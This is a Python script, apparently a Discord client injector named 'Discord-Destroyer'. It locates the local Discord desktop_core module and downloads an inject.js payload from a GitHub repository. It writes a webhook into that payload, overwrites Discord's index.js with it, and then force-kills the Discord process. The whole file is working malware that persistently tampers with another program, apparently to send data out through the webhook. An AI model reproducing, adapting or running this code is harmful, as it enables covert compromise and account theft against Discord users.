import ntpath, os, re, time, subprocess, httpx
from sys import argv


class Start:
    def __init__(self):
        self.Webhook = "¤¤¤¤discord£££destroyer3738@darknosy30"
        self.local = os.getenv("localappdata")
        self.startup_loc = ntpath.join(
            os.getenv("appdata"),
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup",
        )
        self.discord = self.local + "\\Discord"
        for d in os.listdir(ntpath.abspath(self.discord)):
            if re.match(r"app-(\d*\.\d*)*", d):
                self.app = ntpath.abspath(ntpath.join(self.discord, d))
                self.modules = ntpath.join(self.app, "modules")
                if not ntpath.exists(self.modules):
                    httpx.post(self.Webhook, json="")
                for dir in os.listdir(self.modules):
                    if re.match(r"discord_desktop_core-\d+", dir):
                        self.inj_path = (
                            self.modules + "\\" + dir + f"\\discord_desktop_core\\"
                        )
                        if ntpath.exists(self.inj_path):
                            if self.startup_loc not in argv[0]:
                                try:
                                    os.makedirs(
                                        self.inj_path + "initiation", exist_ok=True
                                    )
                                except PermissionError:
                                    pass
                            f = httpx.get(
                                "https://github.com/DARKNOSY/Discord-Destroyer/raw/main/inject.js"
                            ).text.replace(
                                "webhook: '%WEBHOOK%'", f"webhook: '{self.Webhook}'"
                            )
                            try:
                                with open(
                                    self.inj_path + "index.js", "w", errors="ignore"
                                ) as indexFile:
                                    indexFile.write(f)
                            except PermissionError:
                                pass

def Close():
    for proc in os.popen('tasklist').readlines():
        if 'Discord.exe' in proc:
            pid = int(proc.split()[1])
            subprocess.run(['taskkill', '/F', '/PID', str(pid)])
            break
    time.sleep(3)
    # no restart, pr if you want one so bad

Start()
Close()
